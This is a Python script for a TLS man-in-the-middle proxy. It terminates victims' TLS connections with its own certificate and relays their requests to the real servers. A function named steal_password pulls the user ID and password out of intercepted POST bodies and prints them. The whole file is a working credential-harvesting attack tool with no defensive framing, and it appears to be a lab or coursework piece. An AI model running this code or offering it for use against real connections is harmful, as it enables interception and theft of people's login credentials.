import socket
import socket
import ssl

HOST = '0.0.0.0'
PORT = 8080
certFile = "certificates/host.crt"
keyFile = "certificates/host.key"


def receive(connection):
    all_data = b''
    headers_data = {}
    length = 0

    while True:
        data = connection.recv(4096)
        all_data += data
        if b"\r\n\r\n" in all_data:
            index = all_data.find(b"\r\n\r\n")
            body = all_data[index + 4 :]
            headers = all_data[:index]
            headers = headers.decode().split("\r\n")
            for header in headers:
                if ": " in header:
                    header = header.split(": ")
                    headers_data[header[0]] = header[1]
                else:
                    header = header.split(" ")
                    headers_data["Type"] = header[0]
            break
    
    if "Content-Length" in headers_data:
        length = int(headers_data["Content-Length"])
        length = length - len(body)

        while length > 0:
            data = connection.recv(4096)
            all_data += data
            length = length - len(data)
    
    if "Transfer-Encoding" in headers_data and  headers_data["Transfer-Encoding"] == "chunked":
        length = body[:4]
        length = int(length, 16) - len(body)
        
        while length > 0:
            next_length = 0
            data = connection.recv(4096)        
            all_data += data
            if data[-5:] == b"0\r\n\r\n":
                break
            if b"\r\n\r\n" in data:
                index = all_data.find(b"\r\n\r\n")
                next_chunk = all_data[:index]
                next_length = next_chunk[:4]
                next_length = int(next_length, 16)
            length = length - len(data) + next_length
        
    return all_data, headers_data

def steal_password(data):
    data = data.decode()
    index = data.find("\r\n\r\n")
    body = data[index + 4 :]
    body = body.split("&")
    id = body[0]
    password = body[1]

    print(id, ", ", password)


def handle_victim_connect(server):
# connect to victim
    client_socket, addr = server.accept()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certFile, keyfile=keyFile)
    victim_connection = context.wrap_socket(client_socket, server_side=True)
# handle request
    request, headers = receive(victim_connection)
    host = headers["Host"]
    port = 443

# handle post request
    request_type = headers["Type"]
    if request_type == "POST":
        steal_password(request)
        
    ip_addr = socket.gethostbyname(host)
    print(f"TLS connection established: [{ip_addr}:443]")
# connect to server
    context = ssl.create_default_context()
    server_connection = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=host)

    server_connection.connect((host, port))
    server_connection.sendall(request)

    return victim_connection, server_connection

def handle_server_connect(victim_connection, server_connection):
    response, headers = receive(server_connection)
    victim_connection.sendall(response)


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

while True:
    victim_connection, server_connection = handle_victim_connect(server)
    handle_server_connect(victim_connection, server_connection)

    victim_connection.close()
    server_connection.close()